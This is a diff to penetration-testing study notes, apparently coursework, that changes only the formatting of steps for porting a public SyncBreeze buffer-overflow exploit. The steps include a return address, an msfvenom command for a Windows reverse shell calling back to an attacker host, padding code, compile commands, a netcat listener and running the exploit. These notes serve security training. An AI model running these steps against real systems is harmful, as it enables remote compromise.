@@ -548,8 +548,9 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
    - server.sin_addr.s_addr = inet_addr("192.168.242.10");
    - server.sin_port = htons(80);
    - char request_one[] = "POST /login HTTP/1.1\r\n"  "Host: 192.168.50.120\r\n"  
-   - change the return address `unsigned char retn[] = "\xcb\x75\x52\x73"; //ret at msvbvm60.dll`  (refer https://www.exploit-db.com/exploits/42928)
-   - generate reverse shell payload with msfvenom (x86, c)
+   - change the return address  
+     `unsigned char retn[] = "\xcb\x75\x52\x73"; //ret at msvbvm60.dll`  (refer https://www.exploit-db.com/exploits/42928)
+   - generate reverse shell payload with msfvenom (x86, c)  
      `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.165 LPORT=443 EXITFUNC=thread -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d"`
    - modify the 42341.c  
      ```
@@ -571,16 +572,16 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
      ```
    - application crashes and the EIP register seems to be overwritten by "0x9010090c"
 - Changing the overflow buffer
-   - Allocating memory for the initial buffer using malloc `int initial_buffer_size = 780;`  
-   - Filling the initial buffer with "A" character `memset(padding, 0x41, initial_buffer_size);`  
-   - Memset setting the last byte to a null-terminator to convert the buffer into a string `memset(padding + initial_buffer_size - 1, 0x00, 1);`  
-   - Creating the final buffer for the exploit
-   - Changing the padding allocation size `int initial_buffer_size = 781;`
-   - compile the code and start netcat listener on port 443
-     `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`
-     `sudo nc -lvp 443`
-   - run the exploit
-     `wine syncbreeze_exploit.exe`
+   - Allocating memory for the initial buffer using malloc `int initial_buffer_size = 780;`    
+   - Filling the initial buffer with "A" character `memset(padding, 0x41, initial_buffer_size);`   
+   - Memset setting the last byte to a null-terminator to convert the buffer into a string `memset(padding + initial_buffer_size - 1, 0x00, 1);`    
+   - Creating the final buffer for the exploit  
+   - Changing the padding allocation size `int initial_buffer_size = 781;`  
+   - compile the code and start netcat listener on port 443  
+     `i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32`  
+     `sudo nc -lvp 443`  
+   - run the exploit  
+     `wine syncbreeze_exploit.exe`  
 - **Fixing web exploits**
   - consideration: http/https, specific web path, pre-authentication vulnerability, GET/POST, rely on app setting
   - syntaxError: Missing parentheses in call to 'print' （it was written for Python2)
